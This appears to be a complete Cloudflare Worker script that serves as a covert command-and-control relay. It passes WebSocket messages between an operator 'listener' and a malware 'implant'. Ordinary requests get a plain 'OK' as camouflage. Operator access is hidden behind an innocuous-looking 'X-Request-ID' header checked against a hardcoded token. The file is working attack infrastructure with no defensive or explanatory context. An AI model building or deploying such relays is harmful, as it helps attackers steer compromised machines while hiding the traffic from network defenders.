const AUTH_HEADER = "X-Request-ID";
const AUTH_TOKEN = "g0ivBa8uzZtHGioDOW7s";

let listenerWs = null;
let implantWs = null;

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const upgrade = request.headers.get("Upgrade");

    if (upgrade !== "websocket") {
      return new Response("OK", { status: 200 });
    }

    const role = url.searchParams.get("r");
    const [client, server] = new WebSocketPair();

    if (role === "l") {
      const token = request.headers.get(AUTH_HEADER);
      if (token !== AUTH_TOKEN) {
        return new Response("Forbidden", { status: 403 });
      }
      listenerWs = server;
      server.accept();
      server.addEventListener("message", (evt) => {
        if (implantWs && implantWs.readyState === 1) {
          implantWs.send(evt.data);
        }
      });
      server.addEventListener("close", () => { listenerWs = null; });
      return new Response(null, { status: 101, webSocket: client });
    }

    implantWs = server;
    server.accept();
    server.addEventListener("message", (evt) => {
      if (listenerWs && listenerWs.readyState === 1) {
        listenerWs.send(evt.data);
      }
    });
    server.addEventListener("close", () => { implantWs = null; });
    return new Response(null, { status: 101, webSocket: client });
  },
};
